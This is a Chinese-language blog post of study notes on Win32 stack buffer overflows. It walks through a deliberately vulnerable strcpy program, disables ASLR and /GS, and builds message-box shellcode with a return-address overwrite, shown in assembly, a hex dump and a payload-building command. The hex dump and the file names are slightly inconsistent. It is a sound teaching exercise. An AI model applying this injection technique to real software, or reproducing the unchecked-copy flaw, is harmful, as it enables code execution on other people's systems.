---
layout: post
title: "Stack buffer overflow"
subtitle: "在栈缓冲区溢出的边缘跃跃欲试"
date: 2018-12-01 22:59
tags: 
    - Assembly
    - Win32
---

# Content

缓冲区指的是一块连续的内存，通常情况下就是一个数组。对于 C/C++ 编译器来说不存在“缓冲区”这个概念，因为它只能看见一个指针；因此在访问数组的时候不会有C/C++的内建手段来防止越界。这就导致了容易被攻击者利用的 _缓冲区溢出_ 风险，而且攻击者往往通过精心构造的输入(malformed inputs, aka shellcode)来达到改变程序执行流程的目的。此外，如果缓冲区布置在 **（调用）栈** 上，越过缓冲区的数据可能会 **覆盖返回地址**，来自攻击者恶意代码可能得到执行；但是，令这种攻击可行的原因，归根结底是把程序也视为数据的冯诺依曼计算机架构。

x86 的[栈向下生长](https://stackoverflow.com/a/664779/8706476)（从高地址到低地址），函数的返回地址高于缓冲区起始地址，因此超过缓冲区长度的数据有可能覆盖返回地址。然而栈的生长方向和是否存在缓冲区溢出风险无关。即使栈向上生长（ARM程序在编译时可以指定栈的生长方向），攻击者仍然可以覆盖[子函数调用的返回地址](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stacks_that_grow_up)。

## Overview

本文是 [《0day安全（第2版）》](https://book.douban.com/subject/6524076/) 一书第2、3章的读书笔记。

OS|IDE|Configuration|Goal
-|-|-|-
Windows 10 x64|VS2017|Debug|注入并且执行能够弹出对话框的代码。



### Victim

```cpp
// stack-buffer-overflow.cpp
// stack-buffer-overflow.exe
#include <cstdio>
#include <cstring>
#include <Windows.h>

int main(int argc, char* argv[], char* envp[]) {
    LoadLibrary(TEXT("user32.dll"));

    char input[1024];
    scanf("%s", input);

    foo(input);

    return 0;
}

void foo(const char* str) {
    char buffer[48];
    strcpy(buffer, str);
}
```

- `foo` 函数只接受一个指针作为参数，调用字符串复制函数的同时并没有检查长度。它的作用仅仅是提供一个缓冲区溢出的漏洞；
- `LoadLibrary(TEXT("user32.dll"))` 是为了能在恶意代码中调用 `MessageBoxA`

## The first attempt

### Prerequisite

从第一篇研究缓冲区溢出的文章 _Smashing The Stack For Fun and Profit_(1996) 到现在已经过去20+年，在此期间编译器发展出许多应对缓冲区溢出的措施。因此在编译上面的代码之前需要做一些额外的配置工作：

- 关闭 ASLR([Address space layout randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization))，让目标程序的映像装载到固定基址`0x400000`：
    - "Linker" > "Advanced" > "[Randomized Base Address](https://stackoverflow.com/a/9561294/8706476)" : `/DYNAMICBASE:NO` 
    - [ASLR](https://docs.microsoft.com/en-us/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=vs-2017) 引入自 Windows Vista
- 关闭运行时栈帧错误检查。它会在函数返回之前引入 `__RTC_CheckEsp`
    - "C/C++" > "Code Generation" > "Basic Runtime Checks" : `/RTCu` 或空白。
- 关闭安全检查 `/GS`。它会引入 `__security_check_cookie `。
    - "C/C++" > "Code Generation" > "Security Check" : `/GS-`。
- 为方便起见用文件代替输入：
    - Debugging 标签页 "Command Arguments": `< "$(ProjectDir)\shellcode.in"`

### Layout

考虑采用如下布局 shellcode ：

![Layout of shellcode]({{ "img/stack-buffer-overflow-layout.png" | absolute_url }})

### Steps

我们的目标是让受害者在接受shellcode作为输入以后弹出一个窗口。为此，结合上述布局，我们需要：

- 获取 Windows API `MessageBoxA` 和 `ExitProcess` 的地址；
- 确定第一条指令的地址。这个地址将被用来覆盖 RA，通常位于缓冲区内；
- 确定 RA 到缓冲区的偏移。这个偏移会影响 shellcode 的长度；
- 设计指令并获取机器码。

工欲善其事必先利其器。一些调试器，比如 [x64dbg](https://github.com/x64dbg/x64dbg)，在调试过程中可以浏览模块导出/导入符号，藉此我们可以快速定位函数地址。调试目标程序可以发现，`MessageBoxA` 位于 `0x745E7E60`(user32)，`ExitProcess` 位于 `0x74F43A10`(kernel32)。而目标程序 `void foo(const char*)` 的实现如下：

![Assembly]({{ "img/stack-buffer-overflow-foo.png" | absolute_url }})

顺便说一下，上边的 call 指令的参数 `0day-console-app.4110AA` 其实指向另一条 `jmp` 指令，这条指令将跳转到 `strcpy`。

当前 `ebp` 为 `0x0019FA2C`，缓冲区 `buffer` 起始于 `ebp-0x30`，缓冲区的地址就是 `0x0019FA2C` - `0x30` = `0x0019F9FC`。因为当前 RA 位于 `ebp+4`，shellcode 的长度应大于 0x34(52)。

接下来的工作就是构造 shellcode 了。个人强烈推荐使用 MinGW 的 bash。MinGW Bash 为 Windows 用户提供了一些 *nix 的强大命令(`cat`, `ls`, `grep` 等等)，而且这个东西在安装 git 的时候就自带了。编写下面的可执行代码并保存为文本文件 code.s

```asm
;code.s
BITS 32             ;The BITS 32 directive tells nasm to generate code designed to run on a processor in 32-bit mode
xor ebx, ebx        ;Avoid explicit zeros
mov bl, 0x80
sub esp, ebx        ;Lift stack pointer
xor ebx, ebx        ;Produce zeros
push ebx            ;Null character
push 0x4C494146     ;ASCII "FAIL" in little-endian
mov eax, esp        ;Load address of string "FAIL"
push ebx            ;Push 0
push eax            ;Push the address of string "FAIL"
push eax            ;Push the address of string "FAIL"
push ebx            ;Push 0
mov eax, 0x745E7E60 ;Push the address of MessageBoxA
call eax            ;Call MessageBoxA(0, eax, eax, 0)
;Arguments such as zeros are cleaned by the caller of MessageBoxA(stdcall)
push ebx            ;Push 0                
mov eax, 0x74F43A10 ;Push the address of ExitProcess  
call eax            ;Call ExitProcess(0)
nop
nop
nop
```

由于Visual Studio 的编译器 [cl.exe 不接受助记符文本作为输入](https://stackoverflow.com/a/41018146)，所以在这里用 `nasm` 进行汇编。注意在 x86_64 机器上，缺少 `BITS 32` 制导语句将会编译出[带前缀的指令](https://nasm.us/doc/nasmdoc6.html)。

```sh
nasm code.s -o code.o
```

然后统计一下 shellcode 的长度：

```sh
$ cat code.out | wc -c
38
```

可惜的是这里的 MinGW 没有 `objdump`/`dumpbin`，不过可以用 powershell 的  `format-hex` 查看二进制形式：

```powershell
> format-hex .\code.out

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   31 DB B3 80 29 DC 31 DB 53 68 46 41 49 4C 89 E0  1Û³)Ü1ÛShFAILà
00000010   53 50 50 53 B8 60 7E 5E 74 FF D0 53 B8 10 3A F4  SPPS¸`~^t.ÐS¸.:ô
00000020   74 FF D0 90 90 90 7E 5E 74 FF D0 53 B8 10 3A F4  t.Ð~^t.ÐS¸.:ô
```

最后拼接代码、填充字节和地址 `0x0019F9FC` 成为 shellcode 并写入文件(MinGW):

```sh
echo -n $(cat code.out)$(perl -e 'print "\x90"x(52-38) . "\xfc\xf9\x19\x00"') > shellcode.in
```

回到 Visual Studio，Ctrl+F5 运行 stack-buffer-overflow.exe 即可观察到弹窗，这表示 shellcode 得到执行。


### Issues

值得注意的是：

<!-- 无论程序运行多少次，ntdll 总是被装载到进程中的同一个基址，而且它的装载基址总是最高； -->

- shellcode 位于栈上， 其指令执行顺序和栈的生长方向正好相反。为了防止 shellcode 被覆盖，要事先将栈顶“抬高”到 shellcode 之前；
- shellcode 要避免出现能截断输入的字符：
    - `strcpy` 函数在空字符 `\x00` 处截断参数字符串；
    - `scanf` 函数会在一些空白字符处截断输入。[空白字符](http://www.cplusplus.com/reference/cstdio/scanf/#parameters)包括`' '`(`0x20`), `\t`(`0x09`), `\n`(`0x0A`), `\v`(`0x0B`), `\f`(`0x0C`) 和 `'\r'`(`0x0D`)；
    - 可以用 `format-hex shellcode.in | sls 00` 检查空字符。

这个例子存在不足之处，比如：

- 无法应对启用 ASLR 的目标程序；
- 需要手工查询所需要的 API 的地址；
